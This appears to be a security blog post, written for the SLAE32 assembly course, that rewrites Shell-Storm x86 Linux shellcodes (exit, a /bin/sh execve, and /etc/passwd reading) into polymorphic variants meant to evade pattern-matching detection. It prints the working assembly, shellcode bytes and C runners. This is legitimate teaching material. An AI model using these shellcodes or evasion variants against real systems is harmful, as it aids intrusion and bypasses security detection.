@@ -1,0 +1,543 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>SLAE32 - Assignment#6 [Polymorphic Shellcode] | bigb0ss</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="SLAE32 - Assignment#6 [Polymorphic Shellcode]" /><meta name="author" content="bigb0ss" /><meta property="og:locale" content="en_US" /><meta name="description" content="This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:" /><meta property="og:description" content="This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:" /><link rel="canonical" href="https://bigb0sss.github.io/posts/slae32-assignment-6/" /><meta property="og:url" content="https://bigb0sss.github.io/posts/slae32-assignment-6/" /><meta property="og:site_name" content="bigb0ss" /><meta property="og:image" content="https://bigb0sss.github.io/assets/img/post/slae32/slae32.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-26T11:53:00-04:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://bigb0sss.github.io/assets/img/post/slae32/slae32.png" /><meta property="twitter:title" content="SLAE32 - Assignment#6 [Polymorphic Shellcode]" /><meta name="twitter:site" content="@bigb0ss___" /><meta name="twitter:creator" content="@bigb0ss" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"headline":"SLAE32 - Assignment#6 [Polymorphic Shellcode]","dateModified":"2021-04-26T11:53:00-04:00","description":"This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:","datePublished":"2021-04-26T11:53:00-04:00","@type":"BlogPosting","image":"https://bigb0sss.github.io/assets/img/post/slae32/slae32.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://bigb0sss.github.io/posts/slae32-assignment-6/"},"url":"https://bigb0sss.github.io/posts/slae32-assignment-6/","author":{"@type":"Person","name":"bigb0ss"},"@context":"https://schema.org"}</script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script src="/assets/js/post.min.js" async></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-QE26N8SZTJ"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QE26N8SZTJ'); </script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/bigb0ss/bigb0ss.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">bigb0ss</a></div><div class="site-subtitle font-italic">OSCE | OSCP | Security Blog</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.linkedin.com/in/danielsmin" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/bigb0sss" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/bigb0ss___" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>SLAE32 - Assignment#6 [Polymorphic Shellcode]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>SLAE32 - Assignment#6 [Polymorphic Shellcode]</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 26, 2021" > Apr 26 <i class="unloaded">2021-04-26T11:53:00-04:00</i> </span> by <span class="author"> bigb0ss </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/slae32/slae32.png" class="post-preview-img"><p><b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b></p><p><b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b></p><p><b>Student ID: SLAE-1542</b></p><p><a href="https://github.com/bigb0sss/SLAE32">SLAE32 Assignemt#6 Github</a></p><h1 id="assignement-6">Assignement #6</h1><ul><li>Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching<li>The polymorphic versions cannot be larger 150% of the existing shellcode<li>Bonus points for making it shorter in length than original</ul><h1 id="what-is-polymorphism">What is Polymorphism?</h1><p>The polymorphism means the ability of an object to take on many forms. In computer science, the term polymorphism also means the ability of differnt objects/codes to respond in a unique way to the same functionality.</p><h1 id="shellcode-selection">Shellcode Selection</h1><p>I will use the following shellcode from the Shell-Storm to demonstrate the polymorphic shellcode.</p><ul><li>sys_exit(0) - http://shell-storm.org/shellcode/files/shellcode-623.php<li>/bin/sh - http://shell-storm.org/shellcode/files/shellcode-752.php<li>/bin/cat /etc/passwd - http://shell-storm.org/shellcode/files/shellcode-571.php</ul><h1 id="1-sys_exit0">1) sys_exit(0)</h1><p>The original shellcode from the Shell-Storm is as following:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="cm">/*
+Name   : 8 bytes sys_exit(0) x86 linux shellcode
+Date   : may, 31 2010
+Author : gunslinger_
+Web    : devilzc0de.com
+blog   : gunslinger.devilzc0de.com
+tested on : linux debian
+*/</span>
+
+<span class="kt">char</span> <span class="o">*</span><span class="n">bye</span><span class="o">=</span>
+ <span class="s">"</span><span class="se">\x31\xc0</span><span class="s">"</span>                    <span class="cm">/* xor    %eax,%eax */</span>
+ <span class="s">"</span><span class="se">\xb0\x01</span><span class="s">"</span>                    <span class="cm">/* mov    $0x1,%al */</span>
+ <span class="s">"</span><span class="se">\x31\xdb</span><span class="s">"</span>                    <span class="cm">/* xor    %ebx,%ebx */</span>
+ <span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span><span class="p">;</span>                   <span class="cm">/* int    $0x80 */</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+		<span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">bye</span><span class="p">)();</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>The assembly for the original shellcode (<code class="language-plaintext highlighter-rouge">sys_exit_original.nasm</code>) in Intel is:</p><div class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+
+	<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>    <span class="c1">; Zeroing out EAX</span>
+	<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x1</span>     <span class="c1">; Moving 1 to A low in EAX = #define __NR_exit 1 in unistd_32.h --&gt; void exit(int status);</span>
+	<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>    <span class="c1">; Zeroing out EBX ==&gt; int status = 0x0</span>
+	<span class="nf">int</span> <span class="mh">0x80</span>        <span class="c1">; Executing exit(0)</span>
+</pre></table></code></div></div><p>Modified assembly (<code class="language-plaintext highlighter-rouge">sys_exit_modified.nasm</code>) is:</p><div class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>    <span class="c1">; Zeroing out EAX</span>
+        <span class="nf">inc</span> <span class="nb">eax</span>         <span class="c1">; Increase EAX by 0x1 = #define __NR_exit 1</span>
+        <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>    <span class="c1">; Zeroing out EBX ==&gt; int status = 0x0</span>
+        <span class="nf">int</span> <span class="mh">0x80</span>        <span class="c1">; Executing exit(0)</span>
+</pre></table></code></div></div><p>And let’s compile the both <code class="language-plaintext highlighter-rouge">.nasm</code> files with <a href="https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py">compilerX86.py</a> and compare the bytes:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="c"># python compilerX86.py -f sys_exit_original</span>
+
+<span class="o">[</span>+] Assemble: sys_exit_original.nasm
+<span class="o">[</span>+] Linking: sys_exit_original.o
+<span class="o">[</span>+] Shellcode: <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] ASM code: 0x31,0xc0,0xb0,0x01,0x31,0xdb,0xcd,0x80
+<span class="o">[</span>+] Creating File: shellcode.c
+<span class="o">[</span>+] Compiling Executable: shellcode
+<span class="o">[</span>+] Enjoy!
+
+<span class="c"># python compilerX86.py -f sys_exit_modified</span>
+
+<span class="o">[</span>+] Assemble: sys_exit.nasm
+<span class="o">[</span>+] Linking: sys_exit.o
+<span class="o">[</span>+] Shellcode: <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] ASM code: 0x31,0xc0,0x40,0x31,0xdb,0xcd,0x80
+<span class="o">[</span>+] Creating File: shellcode.c
+<span class="o">[</span>+] Compiling Executable: shellcode
+<span class="o">[</span>+] Enjoy!
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="c"># echo "[INFO] Original:" &amp;&amp; echo -ne "\x31\xc0\xb0\x01\x31\xdb\xcd\x80" | wc -c</span>
+<span class="o">[</span>INFO] Original:
+8
+
+<span class="c"># echo "[INFO] Modified:" &amp;&amp; echo -ne "\x31\xc0\x40\x31\xdb\xcd\x80" | wc -c</span>
+<span class="o">[</span>INFO] Modified:
+7
+</pre></table></code></div></div><p>It resulted in 12% decrease in the polymorphic shellcode.</p><h1 id="2-binsh">2) /bin/sh</h1><p>The original shellcode from the Shell-Storm is as following:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre><td class="rouge-code"><pre><span class="cm">/*
+ Title: linux/x86 Shellcode execve ("/bin/sh") - 21 Bytes
+ Date     : 10 Feb 2011
+ Author   : kernel_panik
+ Thanks   : cOokie, agix, antrhacks
+*/</span>
+
+<span class="cm">/*
+ xor ecx, ecx
+ mul ecx
+ push ecx
+ push 0x68732f2f   ;; hs//
+ push 0x6e69622f   ;; nib/
+ mov ebx, esp
+ mov al, 11
+ int 0x80
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f</span><span class="s">"</span>
+              <span class="s">"</span><span class="se">\x73\x68\x68\x2f\x62\x69\x6e\x89</span><span class="s">"</span>
+              <span class="s">"</span><span class="se">\xe3\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+ <span class="n">printf</span> <span class="p">(</span><span class="s">"Shellcode length : %d bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">code</span><span class="p">));</span>
+ <span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="n">f</span><span class="p">)()</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
+ <span class="n">f</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>The assembly for the original shellcode (<code class="language-plaintext highlighter-rouge">bin_sh_original.nasm</code>) in Intel is:</p><div class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+ 	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
+ 	<span class="nf">mul</span> <span class="nb">ecx</span>
+ 	<span class="nf">push</span> <span class="nb">ecx</span>
+ 	<span class="nf">push</span> <span class="mh">0x68732f2f</span>   <span class="c1">;; hs//</span>
+ 	<span class="nf">push</span> <span class="mh">0x6e69622f</span>   <span class="c1">;; nib/</span>
+ 	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
+ 	<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>        <span class="c1">; execve() = #define __NR_execve 11</span>
+ 	<span class="nf">int</span> <span class="mh">0x80</span>
+</pre></table></code></div></div><p>Modified assembly (<code class="language-plaintext highlighter-rouge">bin_sh_modified.nasm</code>) is:</p><div class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; Zero out EAX</span>
+    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>        <span class="c1">; Zero out EBX</span>
+    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; Zero out ECX</span>
+
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0x68732f2e</span>
+    <span class="nf">inc</span> <span class="nb">esi</span>
+    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="mh">0x6e69622e</span>
+    <span class="nf">inc</span> <span class="nb">edi</span>
+
+    <span class="nf">push</span> <span class="nb">esi</span>
+    <span class="nf">push</span> <span class="nb">edi</span>
+
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>         <span class="c1">; execve() = #define __NR_execve 11</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+</pre></table></code></div></div><p>And let’s compile the both <code class="language-plaintext highlighter-rouge">.nasm</code> files with <a href="https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py">compilerX86.py</a> and compare the bytes:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="c"># python ../compilerX86.py -f bin_sh_original</span>
+ 
+<span class="o">[</span>+] Assemble: bin_sh_original.nasm
+<span class="o">[</span>+] Linking: bin_sh_original.o
+<span class="o">[</span>+] Shellcode: <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] ASM code: 0x31,0xc9,0xf7,0xe1,0x51,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0xb0,0x0b,0xcd,0x80
+<span class="o">[</span>+] Creating File: shellcode.c
+<span class="o">[</span>+] Compiling Executable: shellcode
+<span class="o">[</span>+] Enjoy!
+
+<span class="c"># python ../compilerX86.py -f bin_sh_modified</span>
+ 
+<span class="o">[</span>+] Assemble: bin_sh_modified.nasm
+<span class="o">[</span>+] Linking: bin_sh_modified.o
+<span class="o">[</span>+] Shellcode: <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] ASM code: 0x31,0xc0,0x31,0xdb,0x31,0xc9,0xbe,0x2e,0x2f,0x73,0x68,0x46,0xbf,0x2e,0x62,0x69,0x6e,0x47,0x56,0x57,0x89,0xe3,0xb0,0x0b,0xcd,0x80
+<span class="o">[</span>+] Creating File: shellcode.c
+<span class="o">[</span>+] Compiling Executable: shellcode
+<span class="o">[</span>+] Enjoy!
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="c"># echo "[INFO] Original:" &amp;&amp; echo -ne "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" | wc -c</span>
+<span class="o">[</span>INFO] Original:
+21
+
+<span class="c"># echo "[INFO] Modified:" &amp;&amp; echo -ne "\x31\xc0\x31\xdb\x31\xc9\xbe\x2e\x2f\x73\x68\x46\xbf\x2e\x62\x69\x6e\x47\x56\x57\x89\xe3\xb0\x0b\xcd\x80" | wc -c</span>
+<span class="o">[</span>INFO] Modified:
+26
+</pre></table></code></div></div><p>It resulted in 24% increase in the polymorphic shellcode.</p><h1 id="3-bincat-etcpasswd">3) /bin/cat /etc/passwd</h1><p>The original shellcode from the Shell-Storm is as following:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
+</span> 
+<span class="k">const</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span><span class="o">=</span><span class="s">"</span><span class="se">\x31\xc0</span><span class="s">"</span> <span class="c1">// xorl %eax,%eax</span>
+<span class="s">"</span><span class="se">\x99</span><span class="s">"</span> <span class="c1">// cdq</span>
+<span class="s">"</span><span class="se">\x52</span><span class="s">"</span> <span class="c1">// push edx</span>
+<span class="s">"</span><span class="se">\x68\x2f\x63\x61\x74</span><span class="s">"</span> <span class="c1">// push dword 0x7461632f</span>
+<span class="s">"</span><span class="se">\x68\x2f\x62\x69\x6e</span><span class="s">"</span> <span class="c1">// push dword 0x6e69622f</span>
+<span class="s">"</span><span class="se">\x89\xe3</span><span class="s">"</span> <span class="c1">// mov ebx,esp</span>
+<span class="s">"</span><span class="se">\x52</span><span class="s">"</span> <span class="c1">// push edx</span>
+<span class="s">"</span><span class="se">\x68\x73\x73\x77\x64</span><span class="s">"</span> <span class="c1">// pu sh dword 0x64777373</span>
+<span class="s">"</span><span class="se">\x68\x2f\x2f\x70\x61</span><span class="s">"</span> <span class="c1">// push dword 0x61702f2f</span>
+<span class="s">"</span><span class="se">\x68\x2f\x65\x74\x63</span><span class="s">"</span> <span class="c1">// push dword 0x6374652f</span>
+<span class="s">"</span><span class="se">\x89\xe1</span><span class="s">"</span> <span class="c1">// mov ecx,esp</span>
+<span class="s">"</span><span class="se">\xb0\x0b</span><span class="s">"</span> <span class="c1">// mov $0xb,%al</span>
+<span class="s">"</span><span class="se">\x52</span><span class="s">"</span> <span class="c1">// push edx</span>
+<span class="s">"</span><span class="se">\x51</span><span class="s">"</span> <span class="c1">// push ecx</span>
+<span class="s">"</span><span class="se">\x53</span><span class="s">"</span> <span class="c1">// push ebx</span>
+<span class="s">"</span><span class="se">\x89\xe1</span><span class="s">"</span> <span class="c1">// mov ecx,esp</span>
+<span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span> <span class="p">;</span> <span class="c1">// int 80h</span>
+ 
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">shellcode</span><span class="p">)();</span>
+ 
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+ 
+ 
+<span class="cm">/*
+shellcode[]=	"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64" 
+		"\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
+*/</span>
